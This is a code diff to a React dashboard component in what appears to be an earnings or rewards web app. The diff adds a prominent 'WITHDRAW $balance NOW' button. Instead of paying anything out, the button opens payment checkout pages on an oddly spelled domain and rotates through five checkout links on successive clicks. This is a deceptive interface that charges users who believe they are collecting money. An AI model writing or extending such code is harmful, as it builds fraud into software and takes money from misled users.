@@ -91,6 +91,25 @@ export default function Dashboard() {
   const [showBonusBlock, setShowBonusBlock] = useState(false)
   const [showInitialBlocks, setShowInitialBlocks] = useState(true)
   const [shouldShowEarningsNotifications, setShouldShowEarningsNotifications] = useState(true)
+  const [checkoutClickCount, setCheckoutClickCount] = useState(0)
+  const [showCheckoutSection, setShowCheckoutSection] = useState(true)
+
+  // Checkout links for rotation - each click opens a different checkout
+  const checkoutLinks = [
+    "https://pay.mycheckoutt.com/019bd7bc-513c-728d-8353-f4faa5a4f9e0?ref=",
+    "https://pay.mycheckoutt.com/019bc81f-da82-70e1-b162-ba17cb2000df?ref=",
+    "https://pay.mycheckoutt.com/019bc357-9928-7312-b759-c834c99a4905?ref=",
+    "https://pay.mycheckoutt.com/019b8f52-4227-7017-8c0f-bb67b304acad?ref=",
+    "https://pay.mycheckoutt.com/019bc22f-90be-703f-8dd5-f2c277ec37bc?ref=",
+  ]
+
+  // Handle checkout button click - rotates through checkouts
+  const handleCheckoutClick = () => {
+    const currentIndex = checkoutClickCount % checkoutLinks.length
+    const checkoutUrl = checkoutLinks[currentIndex]
+    window.open(checkoutUrl, "_blank")
+    setCheckoutClickCount((prev) => prev + 1)
+  }
 
   const [toastNotifications, setToastNotifications] = useState<ToastNotification[]>([])
   const [notificationCount, setNotificationCount] = useState(0)
@@ -346,6 +365,15 @@ export default function Dashboard() {
           !function(i,n){i._plt=i._plt||(n&&n.timeOrigin?n.timeOrigin+n.now():Date.now())}(window,performance);
         `}
       </Script>
+
+      {/* Green Checkout Button - Always visible */}
+      <Button
+        onClick={handleCheckoutClick}
+        className="w-full bg-green-600 hover:bg-green-700 text-white py-6 text-lg font-bold shadow-lg mb-4"
+      >
+        <Wallet className="w-5 h-5 mr-2" />
+        WITHDRAW ${currentBalance.toFixed(2)} NOW
+      </Button>
 
       {/* Step-by-step checklist */}
       <section className="bg-gray-900 rounded-lg p-6 border border-gray-800 mb-6">
@@ -1040,7 +1068,7 @@ export default function Dashboard() {
   }, [router])
 
   useEffect(() => {
-    // Removed all checkout modal logic
+    // Checkout section now shows immediately (no delay)
   }, [])
 
   useEffect(() => {
